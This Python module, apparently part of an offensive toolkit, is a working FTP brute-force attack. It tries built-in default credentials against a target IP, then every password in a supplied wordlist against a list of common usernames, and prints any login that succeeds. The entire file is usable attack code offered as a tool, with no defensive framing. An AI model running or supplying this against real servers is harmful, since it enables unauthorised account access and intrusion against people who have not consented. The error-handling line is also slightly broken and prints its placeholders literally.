import ftplib
import os
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from app.utility.colors import C

REQUIRED_OPTIONS = {"IP": "", "PASS": ""}


def test_ftp(target_ip, port, username, password):
    ftp = ftplib.FTP()
    try:
        ftp.connect(target_ip, int(port), timeout=3)
        ftp.login(username, password)
        ftp.quit()
        return True
    except:
        try:
            ftp.close()
        except:
            pass
        return False


def execute(options):
    target_ip = options.get("IP")
    port = 21
    wordlist_path = options.get("PASS")

    print(f"{C.HEADER}--- FTP BRUTE FORCE: {target_ip} ---")
    try:
        for user, passwd in DEFAULT_CREDS:
            if test_ftp(target_ip, port, user, passwd):
                print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
                return

        if wordlist_path and os.path.exists(wordlist_path):
            with open(wordlist_path, "r", errors="ignore") as f:
                password = [line.strip() for line in f if line.strip()]

                for user in COMMON_USERS:
                    print(f"{C.MENU}  [*] Testing user: {user}")
                    for pw in password:
                        if test_ftp(target_ip, port, user, pw):
                            print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{pw}")
                            return

    except KeyboardInterrupt:
        return
    except Exception as e:
        print("{C.ERROR}[x] ERROR: {e}")
        return
